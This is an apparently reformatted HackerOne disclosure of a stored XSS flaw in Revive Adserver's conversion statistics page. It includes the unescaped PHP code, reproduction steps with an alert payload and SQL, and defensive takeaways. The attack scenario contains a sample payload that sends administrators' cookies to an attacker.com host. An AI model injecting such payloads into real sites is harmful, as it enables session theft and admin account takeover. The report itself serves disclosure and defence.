# Stored XSS in Conversion Statistics via Tracker Name - Revive Adserver

## Metadata
- **Source:** HackerOne
- **Report:** 3400506 | https://hackerone.com/reports/3400506
- **Submitted:** 2025-10-26
- **Reporter:** cyberjoker
- **Program:** Revive Adserver
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Stored Cross-Site Scripting (XSS), Privilege Escalation, Improper Output Encoding
- **CVEs:** CVE-2025-52668
- **Category:** web-api

## Summary
Revive Adserver 6.0.1 contains a stored XSS vulnerability in the conversion statistics page (stats-conversions.php:356) where tracker names and campaign names are output without HTML encoding. Low-privilege advertiser accounts can inject malicious JavaScript that executes in admin browsers, enabling session hijacking and account takeover.

## Attack scenario
1. Attacker creates advertiser account or compromises existing advertiser credentials in Revive Adserver installation
2. Attacker navigates to tracker creation interface and injects XSS payload in tracker name field (e.g., <img src=x onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">)
3. Payload is stored unsanitized in database when tracker is saved
4. Conversion records are generated linking to malicious tracker (through normal tracking or database manipulation)
5. Administrator views conversion statistics report at stats-conversions.php?clientid=[id]
6. Tracker name is rendered without HTML encoding, XSS payload executes in admin's browser context, stealing session cookies and enabling account takeover

## Root cause
The application fails to HTML-encode user-controlled output (tracker names, campaign names) when rendering conversion statistics reports. Advertiser-created tracker and campaign names are stored in database without sanitization and rendered directly in HTML context via echo statement without htmlspecialchars() or equivalent escaping function at lines 356-358 of stats-conversions.php.

## Attacker mindset
An advertiser seeking to escalate privileges to admin level. The attack is low-effort (simple HTML injection), requires only legitimate advertiser access, and targets a routine admin workflow (viewing statistics). The persistence of the payload means every admin interaction with that report is an exploitation opportunity, making detection difficult.

## Defensive takeaways
- Implement output encoding at point of rendering: use htmlspecialchars($data, ENT_QUOTES, 'UTF-8') for all user-controlled data in HTML context
- Apply input validation at storage time to reject or strip HTML/script tags in tracker and campaign names
- Use templating engines with automatic escaping enabled rather than manual echo statements
- Implement Content Security Policy (CSP) headers to block inline script execution and restrict exfiltration endpoints
- Enforce principle of least privilege: audit why low-privilege advertisers can modify fields visible to administrators
- Add security code review process focusing on output encoding in reporting/statistics modules
- Audit all stats-*.php files for similar encoding gaps
- Implement HTTPOnly and Secure flags on session cookies to limit JavaScript access

## Variant hunting
Search for similar unencoded output patterns in all stats-*.php files and other reporting modules
Review all database-driven form fields (tracker names, campaign names, advertiser names, etc.) rendered in admin-facing pages
Check for other user-controlled fields in statistics/reporting pages that lack htmlspecialchars() or equivalent
Test CSV/export functionality to determine if XSS payloads are also reflected in exported reports
Examine other privilege escalation paths where low-privilege users control data displayed to high-privilege users
Audit other OA_Permission::enforceAccount protected pages for similar issues

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1651 - Exploitation for Privilege Escalation
- T1059 - Command and Scripting Interpreter (JavaScript)
- T1557 - Adversary-in-the-Middle
- T1056 - Phishing/Social Engineering (implicit via cookie theft)
- T1078 - Valid Accounts (compromised admin account via session hijacking)

## Notes
The vulnerability is particularly dangerous because: (1) tracker creation is a routine advertiser function, (2) conversion report viewing is routine admin function, (3) payload persistence means repeated exploitation without re-injection, (4) statistics page not in default menu suggests it may be overlooked in security assessments but code-level permissions allow access. Reporter discovered campaign-related fields (campaignid, campaignname) also vulnerable on same lines. Multiple other stats files potentially affected but not fully audited. No actual production exploitation or data exfiltration occurred in testing.

## Full report
<details><summary>Expand</summary>

I found stored XSS on the conversion statistics page. Advertisers can inject malicious JavaScript through tracker names, which executes when admins view conversion reports (`www/admin/stats-conversions.php:356`). I was able to steal admin session cookies using this vulnerability. This is a privilege escalation problem: low-privilege advertiser accounts can compromise high-privilege admin accounts.

--

---

## Affected System

- **Product:** Revive Adserver
- **Version Tested:** 6.0.1
- **Component:** Statistics / Conversion Reports
- **File:** `www/admin/stats-conversions.php:356`
- **URL:** `http://[host]/www/admin/stats-conversions.php?clientid=[id]`

---

## Vulnerable Code

```php
// www/admin/stats-conversions.php:356
echo "<td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['trackername']}</td>
      <td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['campaignid']}</td>
      <td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['campaignname']}</td>";
```

**The Problem:**
- Tracker names are output directly without `htmlspecialchars()` escaping
- The data comes from advertiser-controlled input (tracker creation form)
- No input validation strips HTML tags at storage time
- Admins viewing conversion reports execute the payload in their browser context

---

## How I Reproduced It

**Prerequisites:**
- Advertiser account (low privileges)
- Admin account to view the report (for testing impact)

**Steps:**

1. **Login as advertiser** and create a malicious tracker:
   - Navigate to: **Inventory** → **Advertisers** → Click your advertiser name (e.g., "Test Advertiser") → **Trackers** tab
   - Click **Add new tracker**
   - Set tracker name to:
     ```html
     <img src=x onerror="alert('XSS: ' + document.cookie)">
     ```
   - Set tracker type to "Sale" and status to "Active"
   - Click **Save Changes**
   - The tracker is now saved (tracker ID 1)

{F4935037}

2. **Create conversion records** (via normal tracking or database):
   ```sql
   -- Link conversion to malicious tracker
   INSERT INTO rv_data_intermediate_ad_connection (
       tracker_id, ad_id, inside_window, tracker_date_time,
       connection_date_time, connection_action, connection_status, updated
   ) VALUES (1, 1, 1, NOW(), NOW(), 1, 4, NOW());
   ```

3. **Login as admin** and navigate to:
   ```
   http://[host]/www/admin/stats-conversions.php?clientid=1
   ```
   **Note:** This page may not be accessible via the menu in default/fresh installations. See "Menu Configuration Note" in the Notes section below for details.

4. **Result:** JavaScript alert fires immediately:
   ```
   XSS: sessionID=abc123; ox_install_session_id=def456
   ```
{F4935020}

I confirmed the XSS executes in the admin's browser context with full cookie access. The payload persists - it fires every time any admin views conversion statistics for that advertiser.

---

## Notes

**Additional Findings:**

While investigating this issue, I noticed:
- Lines 357-358 also lack `htmlspecialchars()` on `campaignid` and `campaignname`
- Campaign names are also user-controlled (by advertisers) and suffer from the same vulnerability
- Other `stats-*.php` files may have similar issues - I haven't audited them all yet

**Testing Scope:**

I tested this vulnerability in an isolated Docker environment using accounts I created. I did not:
- Test against production/public Revive Adserver installations
- Attempt actual exploitation beyond controlled PoC
- Exfiltrate or access any real user data

**Menu Configuration Note:**

**Important:** The stats-conversions.php page is not included in the default menu system on fresh Revive Adserver installations. During testing, I had to manually enable it by modifying `lib/OA/Admin/Menu/config.php` to add the menu entry:

```php
$oMenu->addTo("2.1", new OA_Admin_Menu_Section("stats-conversions",
    'Conversions', "stats-conversions.php?clientid={clientid}",
    false, "statistics/conversions"));
```

This is likely a configuration issue rather than a security control, as:
- The code-level permission check (`OA_Permission::enforceAccount`) allows advertiser/manager access
- Other statistics pages with similar data are accessible
- The vulnerable code exists regardless of menu visibility

## Impact

An advertiser (or compromised advertiser account) can inject persistent XSS that executes when admins view conversion statistics. I successfully captured admin session cookies, which enable full account takeover. The attacker can then create admin accounts, modify campaigns, access all advertiser data, or inject code affecting all users. This works because advertisers routinely create trackers, and admins routinely review conversion statistics - no unusual behavior required.

</details>

---
*Analysed by Claude on 2026-05-12*
